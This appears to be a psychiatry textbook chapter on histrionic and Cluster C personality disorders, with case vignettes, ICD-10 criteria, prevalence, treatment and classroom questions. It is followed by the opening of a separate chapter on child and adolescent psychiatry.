A 25-year-old female university student sought psychoanalytic treatment as she suffered from depression, difficulties in interpersonal relationships, and vocational dissatisfaction.  Her first panic attack occurred during the last year in high school when her boyfriend was treated for panic attacks. She believed she was &quot;influenced&quot; by him.  In psychotherapy she overcame family difficulties, especially in relation to her mother, but continued to feel insecure and pessimistic, blaming it all on her boyfriend.  Their conflictual relationship ended when she had an episode of depression.  She felt she wanted to die and sought consultation for psychoanalytic treatment saying that she was wasting her life, and lacked motivation for studies or career.  She dreamt about her former boyfriend, and after breaking up with two other men she felt extremely lonely. She is the third of seven children. The father was hard-working, affectionate and caring, but also irritable and depressive. The mother was impulsive and sarcastic. Mother and daughter had a close but conflictive relationship as the mother could be intrusive, opinionated and idealizing. At age three the parents moved abroad for one year and left her to live with relatives. Upon their return she was presented to a baby brother. Significant sensitivity during her school years led her to break up friendships and feel extremely lonely. She did well at university, formed friendships but noticed that she often felt rejected without knowing why. In psychoanalysis four times per week she presented several contradictions, i.e., pursuing  treatment and lapsing,  or describing her mother as unsupportive, cold and envious but nevertheless readily resorting to her when facing difficulties.  As the psychoanalysis progressed she presented infantile histrionic features; a precarious identity, strong affective dependence, dissociation, infantilization and self destructive work related behaviour.  She brought multiple dreams to the sessions and gave vivid images of conflicts that worried her. Despite efforts to interpret, the analyst noticed no progress. Paradoxically, her presentation of dreams and associations indicated in-depth psychological work, but her persistent tardiness and absenteeism reflected the opposite. After eight months of psychoanalysis, the analyst suggested 3 sessions per week of face to face psychotherapy and referred her to a colleague.

;Clinical description

Diagnostic Criteria DSM-10

F60.4 	Histrionic personality disorder

	Personality disorder characterized by:

(a) self-dramatization, theatricality, exaggerated expression of emotions;

(b) suggestibility, easily influenced by others or by circumstances;
 
(c) shallow and labile affectivity;

(d) continual seeking for excitement and activities in which the patient is the centre of attention;

(e) inappropriate seductiveness in appearance or behaviour;

(f) over-concern with physical attractiveness

Associated features may include egocentricity, self-indulgence, continuous longing for appreciation, feelings that are easily hurt, and persistent manipulative behaviour to achieve own needs.

lncludes: 	hysterical and psychoinfantile personality (disorder)

In  DSM-IV-TR (2000)  HPD is described as a pervasive pattern of excessive emotionality and attention-seeking behaviour.  People with HPD show seductive inappropriate behaviour, shallow emotional expressions, impressionistic speech, suggestibility, and a belief that relationships are more intimate than they really are. They have strong need for attention, pursued by a sensational physical appearance, or by being emotionally dramatic and expressive, or inappropriately sexually provocative or seductive. Individuals with HPD range from high level classical hysterical character neuroses to more primitive character functioning presenting with dissociative language, vivid fantasy life and infantile dependence.

;Prevalence

DSM-IV-TR (2000) suggests that about 2% - 3% of the general population and 5% – 10%  of the clinical population meet criteria for HPD.  

;Etiology 

Repression and somatisation of strong emotions are considered the main etiological factors in hysteria. 

;Course and prognosis
The course and prognosis of HPD depends upon comorbidity and level of severity of the disorder.  Intense and chronic anger and stormy close relationships are indicators of poorer prognosis. Ability to reflect and tolerate regularity can prevent treatment failure (Stone, 2005).

;Comorbidity
Major depressive disorder, Somatization disorder and Conversion disorder are the most common comorbid Axis I disorder with HPD. Association between the other Cluster B personality disorders have also been found. Individuals with HPD can also present with increased attention driven risk for suicidal gestures and threats.  

;Treatment
Histrionic personality traits are usually requiring long-tem treatment and psychodynamic psychotherapy is the most common modality. Higher functioning neurotically organized individuals can be treated with psychoanalysis,  while people with more primitive functioning may benefit from supportive or cognitive therapy which focuses on the patient's automatic thoughts and beliefs and on modifying emotional and interpersonal reactivity (Gabbard &amp; Allison, 2007).

==== Cluster C ====
 
Cluster C includes the Avoidant, Dependent, and Obsessive-Compulsive Personality Disorders. Individuals with these disorders often appear anxious or fearful. Avoidant Personality Disorders exhibit a pattern of social inhibition, feelings of inadequacy, and hypersensitivity to negative evaluation. Dependent Personality Disorders show a pattern of submissive and clinging behavior that evidence an excessive need to be taken care of. Lastly, Obsessive-Compulsive Personality Disorders manifest a preoccupation with orderliness, perfectionism, and control.

===== Avoidant Personality Disorder =====

;Case Vignette
The patient was a 35 year old, unmarried data technician referred to a specialized treatment program for personality disorders from an out-patient drug addiction service. His personality pathology was considered more devastating than his substance abuse. Presenting complaints included low self esteem, loneliness, sense of emptiness, suicidal ideation, social isolation, substance abuse, general dissatisfaction with life. Present complaints had been chronic in nature, dating back to childhood. He recalled having daily suicidal thoughts for several years in his early youth. 
On axis I he fulfilled the criteria for dysthymic disorder and drug abuse in partial remission, but not panic disorder or social phobia. His avoidant behavior was more prominent than his level of experienced anxiety. On axis II he fulfilled all seven criteria for avoidant personality disorder and an additional seven criteria spread across other personality disorders. The most prominent feature was a pervasive fear of being ridiculed when interacting with others. 
In a group-based treatment program lasting for 20 weeks, he was a regular, but somewhat
detached participant. The therapists encountered a series of problems related to passivity: He postponed most of his obligations, resisted sorting out practical affairs, did not pay his bills and avoided contacting people who could be helpful. 

;Clinical description

Diagnostic Criteria ICD-10

F60.6 	Anxious [avoidant] personality disorder

	Personality disorder characterized by:

(a) persistent and pervasive feelings of tension and apprehension;

(b) belief that one is socially inept, personally unappealing, or  inferior to others;

(c) excessive preoccupation with being criticized or rejected in social situations;

(d) unwillingness to become involved with people unless certain of being liked; 

(e) restrictions in lifestyle because of need to have physical security; 

(f) avoidance of social or occupational activities that involve significant interpersonal contact because of fear of criticism, disapproval, or rejection.

Associated features may include hypersensitivity to rejection and criticism

Avoidant personality disorder is a pervasive pattern of social inhibition, feelings of inadequacy or inferiority, and hypersensitivity to negative evaluation, according the definition of American Psychiatric Association DSM-IV-TR (American Psychiatric Association, 2000). The term of avoidant personality disorder has been used in DSM, while anxious personality disorder is used in ICD-10 (World Health Organization, 1993).  Although the term avoidant personality disorder was first used by Millon, (1969) these patients have been described as sensitive character (Kretschmer, 1921), introvert (Jung, 1936), interpersonally avoidant (Horney, 1945)), insecure psychopath (Schneider, 1950), phobic personalities (Fenichel, 1945), or active-detached personalities (Millon, 1973). People with this disorder are timid, extremely self-conscious and fearful of criticism, humiliation, and rejection. 

;Comorbidity
Clinical literature has reported that Cluster C personality disorders including avoidant personality disorder often co-occur with mood and anxiety disorders. Avoidant and dependent personality disorders were strongly related to mood disorders, especially major depression, dysthymia, and mania. Avoidant personality disorders were reported to be strongly related to anxiety disorders, especially panic disorder with agoraphobia and social phobia. In addition to mood and anxiety disorders, eating disorders tend to be comorbid with avoidant personality disorder (Oldham et al. 1995). Avoidant personality disorder often co-occurs with other Cluster C personality disorders. This disorder is especially strongly correlated with dependent personality disorder.

;Prevalence
Although there was concern that the prevalence of avoidant personality disorder might be low when it was first included in the DSMIII classification system, it became clear that this is one of most common personality disorders. However, this disorder appears to be more prevalent according to the recent national studies with a large sample size e.g., 2-2.5%. It is quite prevalent within clinical settings and reported to present 5% -35% in psychiatric populations (Mattia et al. 2001). The odds of avoidant personality disorder are greater for the lower income group, people with less than a high school education, the widowed/divorced /separated and never married, and residents in the most urbanized areas (Grant et al., 2004).

;Etiology
Although the etiology of avoidant personality disorder is not known, a few models are proposed. The biological learning theory hypothesizes that the interaction of a biologically determined sensitivity to interpersonal relationships and social experiences affects the development of the disorder. It is also postulated to be an extreme variant of the personality traits of introversion and neuroticism which have heritability. According to the interpersonal etiology model, the disorder is explained based on a conflict between seeking closeness and fearing it. Cognitive theory hypothesizes negative schema which originate in early childhood, and which lead to social avoidance behavior. When the disorder begins in childhood, the symptoms could worsen in adolescence due to the complex and demanding social relationships of this time. 

;Treatment
It is essential to establish a good therapeutic relationship which is, however, very difficult because of the patients’ low self-esteem and hypersensitivity to rejection. Cognitive individual or group format is effective for these types of patients. Social skills training, systematic desensitization, and graded hierarchy of in vivo exposure to feared social situations could be useful (Beck &amp; Freeman, 1990). Both short-term dynamic psychotherapy and cognitive therapy have a place in the treatment of patients with cluster C personality disorders (Svartberg et al. 2004). Exploratory and supportive group therapy may be helpful for these patients by providing a holding environment in which they can share their insecure feelings. 

===== Dependent Personality Disorder =====

;Case Vignette
The patient was a 27 year old white female administrative assistant whose work required much use of the computer and data entry. She gradually began to develop pain in her wrists. Physicians diagnosed a potential carpal tunnel syndrome. The damage to her wrists was not reparable by surgery and Sally was left in significant daily pain.
The patient demonstrates the key aspect of Dependent personality, the need to please others even at the expense to herself. The degree to which her self-destructive passivity and compliance at work stemmed from her early experiences within the family are unclear, but her parents’ overprotectiveness likely played some role in the etiology of her personality pathology. Research confirms that overprotective and authoritarian parenting, alone or in combination, often lead to excessive interpersonal dependency in offspring.

;Clinical description

Diagnostic Criteria ICD-10

F60.7	Dependent personality disorder

	Personality disorder characterized by:

(a) encouraging or allowing others to make most of one's important life decisions;

(b) subordination of one's own needs to those of others on whom one is dependent, and undue compliance with their wishes;

(c) unwillingness to make even reasonable demands on the people one depends on;

(d) feeling uncomfortable or helpless when alone, because of exaggerated fears of inability to care for oneself;

(e) preoccupation with fears of being abandoned by a person with whom one has a close relationship, and of being left to care for oneself;

(f) limited capacity to make everyday decisions without an excessive amount of advice and reassurance from others.

Associated features may include perceiving oneself as helpless, incompetent, and lacking stamina

lncludes: asthenic, inadequate, passive, and self-defeating personality (disorder)

Although early diagnosticians discussed at length the clinical implications of exaggerated dependency needs, it was not until publication of the third edition of the Diagnostic and Statistical Manual of Mental Disorders (DSM-III) that dependent personality disorder (DPD) became a full-fledged diagnostic category. DPD is defined as &quot;a pervasive and excessive need to be taken care of that leads to submissive and clinging behavior and fears of separation&quot; (APA, 1994, p. 668). The person must show several of the following symptoms to receive a DPD diagnosis: difficulty making everyday decisions without excessive advice and reassurance; needing others to assume responsibility for most major areas of life; difficulty initiating projects or doing things on one’s own; going to excessive lengths to obtain nurturance and support; feeling uncomfortable and helpless when alone, being unrealistically preoccupied with fears of being left to care for oneself.

;Comorbidity

The DSM-IV-TR indicates that three Axis I diagnoses - mood disorders, anxiety disorders, and adjustment disorder - show substantial comorbidity with DPD. Evidence supports continued inclusion of these three categories in future versions of the DSM, but also suggests that eating disorders and somatisation disorder co-occur with DPD at higher-than-expected rates (Piper et al. 2001). 

;Prevalence

Problematic dependency is widespread in the community as well as in clinical populations, and is associated with an array of psychological disorders. Studies typically report Dependent Personality Disorder prevalence rates of between 15 % and 25% in hospital and rehabilitation settings (Oldham et al. 1995). Bornstein’s (1993, 1997) meta-analyses of epidemiological findings indicated that gender moderates DPD prevalence rates. When data from extant studies were combined, the overall base rate of DPD was 11% in women and 8% in men. Although this difference seems modest, it is highly significant.

;Etiology

Several theoretical frameworks have been particularly influential in conceptualizing the etiology of the Dependent Personality. Research does not support the early psychodynamic hypothesis that variations in infantile feeding and weaning behaviors play a role in the development of dependent personality traits (Bornstein, 1996). Many psychodynamic researchers (e.g., Luborsky &amp; Crits-Christoph, 1990) now conceptualize problematic dependency as resulting from unconscious conflicts. Cognitive models of DPD focus on the ways in which a person’s manner of thinking helps foster dependent behavior. As Freeman and Leaf (1989) noted, dependency-related automatic thoughts (i.e., reflexive self-statements that reflect the person’s perceived lack of competence) are central in this process. Automatic thoughts are accompanied by negative self statements, which combine to create a persistent attributional bias that reinforces the person’s view of himself as vulnerable and weak. A vicious cycle ensues.

;Treatment

No studies have documented the long-term course of DPD in inpatients, outpatients, or community adults. In the short term, research confirms that dependent patients exhibit behaviors that both facilitate and undermine treatment. For example, dependent psychotherapy patients are cooperative and conscientious, but also make more requests for after-hours contact. Dependent patients delay less long than nondependent patients when psychological symptoms appear, but they also have difficulty terminating treatment after symptoms remit (Bornstein, 1993). Over the years clinicians have provided recommendations for intervention strategies based on cognitive (Young, 1994), psychodynamic (Luborsky &amp; Crits-Christoph, 1990), behavioral (Turkat, 1990), and experiential (Schneider &amp; May, 1995) treatment models. However, only two studies assessed changes in DPD symptoms during the course of psychotherapy, and these investigations produced conflicting results.

===== Obsessive-Compulsive Personality Disorder =====

;Case Vignette

The patient was a 42-year-old single male, who lives with his parents. He has been unemployed for some time. He presented to the anxiety disorders clinic at a major teaching hospital, because of concerns regarding his long-term unemployment. He tended to procrastinate when making decisions or carrying out plans. On weekends, when the family planned to visit the grandparents he would start packing on Friday afternoon, but on many occasions did not finish the packing until Sunday, by which time it was too late to go. He spent long periods of time in the bathroom, would take half an hour to wash his hands-first washing the tap, then his hands, then the tap again. This routine also made it difficult for him to go out and look for job. In fact, it totally prevented him from doing so. After leaving school, he has had 30 or 40 jobs, mostly factory work. The longest he has lasted in a job has been one week, often only one day. 
He was very punctual in treatment and never missed a session; he talked freely, and in great detail. The initial part of therapy mainly dealt with family relationships. When the time came to leave the sessions he would often continue talking and delaying even when the therapist was standing at the door.

;Clinical Descriptions	

Diagnostic Criteria ICD-10

F60.5 	Anankastic personality disorder

	Personality disorder characterized by:

(a) feelings of excessive doubt and caution;

(b) preoccupation with details, rules, lists , order, organization or schedule;

(c) perfectionism that interferes with task completion;

(d) excessive conscientiousness, scrupulousness, and undue preoccupation with productivity to the exclusion of pleasure and interpersonal relationships;

(e) excessive pedantry and adherence to social conventions;

(f) rigidity and stubbornness;

(g) unreasonable insistence by the patient that others submit to exactly his or her way of doing things, or unreas6nable reluctance to allow others to do things;

(h) intrusion of insistent and unwelcome thoughts or impulses.

lncludes: 	compulsive and obsessional personality (disorder)
			obsessive - compulsive personality disorder

Excludes: 	obsessive - compulsive disorder (F42. - )

Diagnostic criteria of ICD-10 (WHO, 1992) and DSM-IV-TR (APA, 2000) for the OCPD (or anankastic personality disorder, following the ICD-10) are quite similar. Both nosological systems describe a syndrome characterized by symptoms such as excessive perfectionism, stubbornness, rigidity, and lack of decision. For the DSM-IV-TR, the OCPD is a pervasive pattern of preoccupation with orderliness, perfectionism, and mental and interpersonal control, at the expense of flexibility, openness, and efficiency, beginning by early adulthood and present in a variety of contexts. 

;Comorbidity

Most research shows that most individuals with Axis I Obsessive-Compulsive Disorder do not fulfill the criteria of OCPD. Furthermore, it has been found that patients with OCD and with a personality disorder show similar or more frequent relationships with the avoidant or dependent personality disorder than with OCPD. Comorbidity with other personality disorders has varied markedly depending on the specific study. 

;Prevalence

(Maier et al. (1992) found that the Obsessive-Compulsive Personality Disorder was the second most frequent personality disorder (among the 11 included in the DSM-III-R) in his study sample (individuals without psychiatric disorders), showing a range from 1.6% to 6.4%, while the prevalence found by Widiger &amp; Sanderson (1997) ranged from 1% to 3%. 

;Etiology  

The etiology of Obsessive-Compulsive Personality Disorder is unknown. There are not data regarding the influence of biological factors in the onset and development of this disorder, but it is believed that environmental factors play an important role in its etiology. Millon (1996) proposes some of these tentative variables: parental over-control is a method of restrictive child-rearing in which punitive processes are used to set distinct limits on children’s behavior. As long as they operate within the parental approved boundaries, children are safe from parental punishment. The acquisition of behavior patterns of OCPD are learned vicariously and by imitation. 

;Treatment

Neither pharmacological, nor psychoanalytical, interpersonal, or cognitive-behavioral perspectives have empirical proven techniques for the modification of OCPD. One of the most frequent symptoms present in individuals with OCPD, causing inefficiency is their inability to give priority to important tasks instead of focusing on trivial or less important tasks, and also their inefficient distribution of time. A coping strategy would be good management of time strategies. Furthermore, these strategies would allow the individual to save time and devote it to other leisure and social activities.

===Curriculum Suggestions=== 

The following general questions are suggested to be discussed in classrooms:

#Why are PDs useful for mental health workers (psychiatrists, psychologists, social workers) to understand as a key component of their clinical activities?
#Discuss the social costs of the PDs, their widespread prevalence and their associated civic and public health consequences and disruptions.
#Why is the traditional concept of &quot;disease&quot; not suitable when discussing the nature of the PDs? Why do some thinkers consider PDs to be best considered as similar to the biological immune system?
#How can normality and abnormality best be differentiated? Is there a sharp line separating them or are they on a continuum?
#The history of ideas about personality goes back to the early Greeks. Discuss some of these interesting ideas and major thinkers from the past to the present.
#What are some of the issues, as well as the similarities and differences between the ICD-10 and DSM-IV in their formulation of the PDs.
#Do personality disorders really exist or are they just convenient fictions of theory, clinical observation or research investigations?
#What are the issues in the categorical vs. dimensional PD debate, and does the prototypical idea help solve them?
#Discuss the role of biogenic, psychogenic and sociogenic influences in PD development pathogenesis? Describe some of the research evidence for their respective contributions.
#Describe the several modes and specific tools of diagnosing the PDs, and discuss their respective strengths and weaknesses.
#Go into considerable detail in specifying the strengths of either the cognitive or the psychodynamic approach to therapy for the PDs.
#What are the comparative advantages and disadvantages of adhering to one specific school of therapy versus several combined schools, e.g., behavioural, pharmacologic in treating the PDs.

;Curriculum Suggestions – Module II 

The following questions for each personality disorder are suggested to be discussed in classrooms:

#What are the most outstanding and significant features for each personality disorder that best identifies and differentiates them from other personality disorders?
#In what way does each personality disorder resemble or overlap with other disorders, including both Axis I and Axis II disorders?
#What are the major commonalities in the etiology of the personality disorders?  Which personality disorders have primarily developmental origin, and which have a strong potential genetic origin?
#Identify specific cultural factors in your country/cultural environment that influence the understanding and treatment of certain personality disorder features.
#What are the most striking gender differences among personality disorders – i.e., which disorders are, according to the text, most common among men, and among woman? How does that compare to your cultural experiences? Discuss reasons for observed differences
#How does the prevalence of each personality disorder vary in your country/culture compare to those prevalence rates mentioned in the Module II text?
#Discuss and compare the differences between treating personality disorders and Axis I disorders. How do co-occurring Axis I disorders influence treatment of a personality disorder, and vice versa, how can  the presence of a  personality disorder affect the course and treatment of an Axis I disorder such as Bipolar disorder or Major Depression or Eating Disorder. Give examples. 
#Compare the major contemporary controversies of each personality disorder and discuss future changes in diagnostic classifications and important areas for research.

      <text xml:space="preserve">==Introduction==

Children cannot be considered to be little adults.  Child and adolescent psychiatry is a unique area and conceptualisations typical of adult mental health are often either not helpful such as the rubric of personality disorders, or fall short in terms of emphasis.  For example whilst adult practitioners will consider the patient’s family, in childhood and adolescence the family may be a source of solutions that lead to symptom reduction, a barrier to change or indeed the cause of the child's presentation.

Child and adolescent psychiatrists conceptualise their patients and their patient’s challenges in a unique way. This focuses on the twin concepts of development, the changes that occur as part of growing up, and of the inter-relatedness of the child and those around them which as a shorthand can be called the systemic perspective.  

To elaborate, a fundamental task of infants, children and adolescents is to grow and in so doing learn to regulate, or achieve mastery over physiological, behavioural and emotional systems such as the ability to sleep, eat, self-soothe and control the excesses of behaviour and impulsivity.  As adults we do not, and cannot live life as &quot;toddlers&quot; and few adults would tolerate temper tantrums in their work colleagues.  A developmental perspective allows the child and adolescent psychiatrist to know that stranger danger in a baby is normal and separation anxiety for the first few days of school is also within the normal limits.  Similarly, the child and adolescent psychiatrist knows there should be a gradual improvement in the young boy’s ability to sit still and attend in class.  Not to do so may suggest pathology.  A grounding in what abilities and limitations to expect of children and adolescents, by age, gender and influenced by cultural expectation is essential to working in this area.

The content of some child and adolescent conditions demonstrate a developmental presentation pattern. For example, an underlying vulnerability to anxiety may become manifest in different ways across the child and adolescent developmental span.  Of the anxiety-related presentations early issues include prolonged and excessive stranger danger; in the older child prolonged school-related separation anxiety. In pre-school children phobias often manifest as a fear of animals, in early school-age children as fear of the dark and/or burglars, school phobia around the age of entry to high school, in adolescence social phobia and late adolescence sees the onset of agoraphobia and panic disorder. 

A systemic perspective emphasises that infants, children and adolescents are not &quot;islands,&quot; indeed the very young cannot live without the care and protection of adults.  Further, children develop within systems or social networks, most obviously the immediate and extended family and the school environment, the latter including peers and teachers.  Included in such understandings will be culturally dependent rules such as how extended is the typical family. For example, is it the norm for grandparents to live with the child and parents; how open or closed is the family to non-familial influences such as the impact of religious or village leaders and the influence of the media.  As well as the generally applicable culture within which the family sits there are patterns of interaction and belief which may be more individual to the particular family and not necessarily shared by their neighbours.  The parents may be in conflict and the child caught in the middle.  A parent may be chronically ill and the child adopting a carer role.  Understanding of both individual family systemic issues and the wider cultural influences are important to the practice of child and adolescent psychiatry in a variety of ways. In terms of engagement for instance one must to know whether it is appropriate to conduct a home visit, how to address parents and grandparents and what sort of formulations are likely to make sense to the child and family. A systemic perspective is also important to management. This is universal in child and adolescent psychiatry, not restricted to cases where the treatment modality is family therapy. Clearly an intervention that contravenes a local or family belief is unlikely to be supported by the family, and is therefore unlikely to be successful.  

Biological thinking, whilst in children less likely to lead to pharmacological interventions, is highly relevant to child and adolescent psychiatry.  Biological constructs that may be important to a child's mental health presentation include a history of any pathological processes that may have affected the child’s developing brain.  Examples include infections and toxic insults during pregnancy or anoxic brain damage during labour or the first minutes of life.  The child and adolescent psychiatrist routinely takes a history about such issues, as well as considering the child's facial and body morphology for possible chromosomal or genetic abnormalities, and any evidence of developmental delay during the early years.  Developmental delays may be circumscribed but more commonly may cross functional domains so a broad and comprehensive assessment is required. It will be found, for example, that many children with behavioural problems are also clumsy.  Developmental problems, even though due to problems before or around birth, may not manifest themselves immediately.  For example a lowered intelligence or specific learning or speech problems may not become obvious until the child enters the late preschool or early school period.  In adolescence biological issues that arise are less likely to be developmental and more likely to be the adverse mental health effects of injury or misadventure, or related to the development of an acute or chronic medical illness such as diabetes or drug use and abuse.

Later in this chapter issues of disease classification relevant to child and adolescent psychiatry will be discussed.  The preceding introductory comments may lead some readers away from classifications that are primarily categorical such as the ICD-10 and DSM systems.  These classifications are important in child and adolescent psychiatry and facilitate good communication, research and service planning.  However, child and adolescent psychiatrists are equally influenced by and comfortable with dimensional views of psychopathology.  For example, where the child lies on a dimension of inattention is as important as is the question as to whether the child has Attention Deficit Hyperactivity Disorder.  A dimensional view has the added benefit of potentially being less &quot;pathologising&quot; in that embedded in this approach is the understanding that healthy children also have a degree of &quot;whatever it is&quot; (i.e., inattention) but either have a more &quot;healthy&quot; amount or are more able to cope with it. With this perspective, rather than seeking cure of a categorical disorder, the child and adolescent psychiatrist will work to help the child and family move towards a more functional developmental trajectory. An example of this might be, in the case of a child with attention deficit, to attend more to the need to achieve education and less to the treatment of symptoms.  This might, for instance, lead to the planning of a medication regime in a way which gives maximal attentional enhancement when the child is in school. 

A useful dimensional nosology often used in child and adolescent mental health is the distinction between internalizing and externalizing symptoms. Formally derived from the scoring system of the Child Behavior Checklist (CBCL: Achenbach, 1991) and related measures, this terminology has now entered more general usage. Externalising symptoms are clearly witnessed or reported, obvious to an observer whereby the child will &quot;externalise&quot; an assumed feeling state, cognition or demonstrate lack of age-appropriate regulation. Typical symptoms include anger, aggression and hyperactivity. Internalising symptoms are less obvious, indeed may go unreported without appropriate questioning. Typical internalizing symptoms are depressed mood and specific and generalized fears.

== Phenomenology ==

=== Epidemiology ===

Population based surveys across numerous countries and cultural groups have recorded the prevalence of mental health disturbance in children and adolescents at between 15 - 20%. Methodological and design issues include whether the research was primarily parent report which finds higher rates of externalising disorders; child and youth self-report which provides better estimates of internalising disorders; or more robust designs which included information from multiple informants. General trends include higher rates of externalising disorders in males and of internalising disorders in females.  Often, as is the case with depression, gender-based rates are similar in the pre-pubertal period. Post-puberty rates of depression are higher in females. Some conditions present at specific developmental stages, for example early onset psychosis is rare before the middle teenage years, or demonstrate a clear developmental relationship or progression.  An example of the latter is the common trajectory from oppositional defiant disorder (ODD) in children to conduct disorder in adolescents. 

It is probable there are many reasons for cross-cultural differences in the prevalence of specific conditions. One is that the prevalence of illness/disorder will be influenced by local conditions; anorexia nervosa is more common in affluent developed world.  Another is the willingness to diagnose depends on culture; what was naughtiness in some western societies is now ODD or ADHD. With these caveats in mind useful prevalence estimates include a rate and diagnosable depressive disorder of approximately 3%, anorexia nervosa 0.5%, ADHD 6%, ODD and CD 6-10% (increasing with age) and autism 0.1%. Note one cannot simply add these prevalence figures and conclude that most children have a mental health problem.  Conditions are often comorbid with one individual sometimes experiencing two or three mental health disorders. 

Another consideration is impairment. Many symptoms such as mild anxiety, brief lowered mood or nightmares after a traumatic event are often normal. Key to the diagnosis and subsequent management plan is the impairment in daily functioning. If symptoms  interrupt the child’s family or peer relationships, or impede their ability to attend and take advantage of school and other activities i.e., if symptoms either prevent normal function or normal development, then the presentation is more serious and worthy of an intervention. One measure of impairment is the disability adjusted life years (DALY) methodology.  A recent application of this methodology to the child and adolescent mental health area suggests the impairment burden of neuropsychiatric conditions in children will double by the year 2020. 

=== Clinical symptoms and classification ===  

A major issue differentiating child and adolescent psychiatry from practice with adults is that the content of symptoms varies across the child and adolescent developmental span.  Consider the example of depression.  The symptoms displayed by older adolescents are often identical to the adult criteria for a major depressive disorder, for example a pervasively lowered mood, often with diurnal mood change, anhedonia, neurovegetative changes in sleep, appetite, weight and energy and typical depressive cognitions of helplessness, hopelessness and possibly suicidal thinking. This is very different from the picture seen in younger children.  An eight year old, for example, can become profoundly depressed in mood without much in the way of depressive cognitions and is unlikely to report suicidal thinking.  The very young child may seem sad without much verbal elaboration, relatively mute and markedly withdrawn with no pleasure in play or during other typical childhood activities. Uncertainties over whether a low mood in a younger child without significant depressive cognitions is the equivalent of a more adult type picture in an older adolescent, have, in the past, and perhaps in the present too, lead to difficulties in making valid diagnoses particularly in the younger age group.

Another group of disorders which show considerable variation with age are the anxiety disorders.  Fear of the dark is so common in very young children as to be normal. However, with increasing age fears become more related to social interaction such as fear about being asked questions or giving presentations in class, difficulties talking to peers, or to adults when attempting to buy food, clothes or bus tickets. Similarly, age differences are seen in the anti-social domain; younger children rarely engage in assault with weapons or force others into sexual activity, these are features of conduct disturbance in older age groups.

Often clinicians will ask screening questions about typical externalising and internalising symptoms.  Considering the former, disruptive young children are oppositional, defiant, easily angered, have prolonged or severe tantrums and actively defy authority figures. Older children and adolescents engage in aggressive behaviour: fighting, bullying, sometimes using a weapon, cruelty to animals or forcing others into sexual activity.  They may also steal or vandalise property.  The oppositional defiant behaviour seen at a younger age may also persist into adolescence. Other common behavioural presentations are inattentive and/or hyperactive behaviour which may occur in isolation or co-occur with aggressive or defiant behaviour. Children with these symptoms may demonstrate problems with their ability to maintain age-appropriate attention and concentration, problems controlling impulsivity or demonstrate hyperactive behaviour. &quot;Age-appropriate&quot; is a key construct in that there may be a considerable gap between this and the behaviour expected by parents. The latter can be either too permissive or inappropriately demanding for the child’s developmental stage. The symptoms are often prominent in classroom settings; they are of greater significance if they are present across numerous settings, typically including home and school. Hyperactive symptoms include the sense that child is always moving, cannot remain still even for an enjoyable activity and the behaviour may lead to dangerous play with risk of injury. Another group of behavioural presentations are the stereotypical, repetitive behaviors such as hand twirling or flapping or unusual mannerisms seen in children with autism and pervasive developmental disorders. Such behaviours have no functional significance, begin early in life and often persist. These behaviours should be differentiated from tics, for instance seen with Tourettes disorder or from medication side effects such as may be caused by some anti-psychotic medication. Autistic children may also demonstrate hyperactive and aggressive behaviours.

Internalising symptoms are often considered to be synonymous with anxiety and depressive symptoms. However, a broader definition is probably more useful. This would for example, include the body image disturbance typical of eating disorders. Many internalizing symptoms have been previously mentioned in this chapter. Childhood fears are common. In young children these are often poorly elaborated fearful feelings. With increased age they may be associated with cognitions typical of panic such as pre-event wishes to avoid the situation, or feelings that symptoms such as tachycardia are evidence of impending physical illness or death. Other common anxiety symptoms of children are obsessional thoughts, especially about germ’s or poisons, fears about school, and nightmares seen in Post traumatic stress disorder (PTSD). As with anxiety, depressive symptoms too change with age.  In younger children they are not specific, and often take the form of a desire to withdraw and be alone and a general lowered mood. With age the child may become more pessimistic, hopeless and feel they are worthless or incompetent. From the mid-teen years onwards suicidal thoughts are common. These are of more concern if the thoughts are accompanied by detailed planning and a desire to enact the plan. In children and adolescents it is useful to identify the symptom of anhedonia (loss of the typical pleasure response). It is unusual for primary-school age children to avoid parties or activities and lose interest in interacting with friends. Adolescents can often describe an altered sense of pleasure; the younger child may not be able to describe this change. However, parents are often able to report this phenomenon as altered behavior – parents notice the child does not take as much pleasure in their usually enjoyed activities. 

It is beyond the scope of this chapter to discuss all symptoms seen in child adolescent psychiatric practice.  Many low prevalence conditions have typical or pathognomic symptoms such as eating non nutritious substances (Pica), being persistently mute despite normal speech and vocalisation apparatus, especially when outside the home environment (Selective Mutism), deficiencies in reciprocal social awareness and behaviours (Autism and Pervasive developmental disorder), tics, encopresis, enuresis and disturbances of attachment to name some. A comprehensive child adolescent mental health text is recommended to further study such conditions.  

Attachment related symptoms are common and require some comment. Infants, including very young children are innately social and from birth demonstrate a repertoire of behaviours that promote attachment to parents, primary caregivers and other adults.  Normal, adaptive, &quot;secure&quot; attachment behaviour is demonstrated by the infant maintaining suitable proximity to the parent, a willingness to explore the environment whilst repeatedly seeking assurance and a developing ability to self-soothe during brief periods of separation. Attachment styles where the infant is more anxious, ambivalent or disorganized include infants who are overly vigilant and excessively watchful, overly withdrawn or inconsistent in developmentally appropriate social interactions. Such behaviours are more likely to cause both current difficulties with establishing eating and sleeping and other routines, as well as the infant being more likely to develop mental health problems during later childhood. 

=== Assessment ===

As previously mentioned, as a generalisation children live within a family context and so it is usual to begin with interviewing the whole family.  If there are no biological parents then the child is seen with the usual caregivers; for orphaned children the child is seen with the adult responsible for their care. Again, the practitioner needs to be knowledgeable on the child's developmental stage and what are the usual capacities and competencies for a child of that age.  Importantly, this includes knowledge of the communication style and ability that would be expected.  Some practitioners are fortunate in that they have been personally exposed to caring for young children in non-clinical settings.  If this is not the case the practitioner can be guided by the type of school activities that are typical for children of different ages and school grades.  For example, very young children in the school setting are often engaged in creative activities.  Play is the primary communication mode of young children.  Older children will draw, colour in or engage in imaginary play with toy figures. Towards the end of primary school children will more readily engage in conversation, although will often give few details spontaneously.  Guiding the conversation with drawings or timelines or an activities leads to greater richness of detail. Adolescents will usually engage in greater self reflection and prolonged conversation and are often seen before other family members to emphasise their progress towards individuation from the family.  Cultural issues are important when considering what information should come from father or mother and whether children should be seen by themselves or only when other family members present.

=== Pathogenesis ===

An approach seen across many areas of psychiatry is the biopsychosocial-cultural schema. This schema emphasises the child lives within a family, school, local environment context and there may need to be interventions at numerous parts of the individual and social ecology to achieve a successful outcome.  Rather than consider biopsychosocial-cultural factors during the infant, child, early and late adolescent stages separately, this section will take an over-arching developmental view and integrate these various ecological influences at different stages of development.
       
